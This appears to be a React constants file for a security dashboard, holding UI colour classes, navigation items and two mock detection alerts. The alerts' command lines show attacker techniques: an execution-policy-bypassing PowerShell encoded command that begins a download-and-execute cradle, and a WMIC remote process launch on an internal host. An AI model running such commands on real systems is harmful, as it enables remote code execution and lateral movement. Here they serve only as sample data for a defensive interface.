
import React from 'react';
import { 
  LayoutDashboard, 
  Compass, 
  Settings, 
  Activity,
  Shield,
  Zap,
  Box,
  Heart
} from 'lucide-react';

export const COLORS = {
  bg: 'bg-slate-50 dark:bg-[#0b0f1a]',
  panel: 'bg-white dark:bg-[#111827]',
  border: 'border-slate-200/60 dark:border-slate-800/40',
  text: 'text-slate-900 dark:text-slate-100',
  subtext: 'text-slate-400 dark:text-slate-500',
  accent: 'emerald-500',
};

export const NAVIGATION_ITEMS = [
  { id: 'dashboard', label: 'Overview', icon: <LayoutDashboard size={20} strokeWidth={1.5} /> },
  { id: 'analyst', label: 'Intelligence', icon: <Compass size={20} strokeWidth={1.5} /> },
  { id: 'admin', label: 'Systems', icon: <Settings size={20} strokeWidth={1.5} /> }
];

export const MOCK_ALERTS: any[] = [
  {
    id: 'AL-9281',
    timestamp: '14:22:10',
    hostname: 'SEC-WKSTN-01',
    severity: 'CRITICAL',
    ruleTriggered: 'PowerShell Download',
    confidence: 94,
    commandLine: 'powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQp...',
    processId: 4412,
    parentProcessId: 1024,
    processName: 'powershell.exe'
  },
  {
    id: 'AL-9282',
    timestamp: '14:35:45',
    hostname: 'SRV-AD-01',
    severity: 'HIGH',
    ruleTriggered: 'WMI Process Execution',
    confidence: 88,
    commandLine: 'wmic /node:"10.0.0.15" process call create "C:\\Windows\\System32\\cmd.exe /c whoami"',
    processId: 8820,
    parentProcessId: 650,
    processName: 'wmiprvse.exe'
  }
];
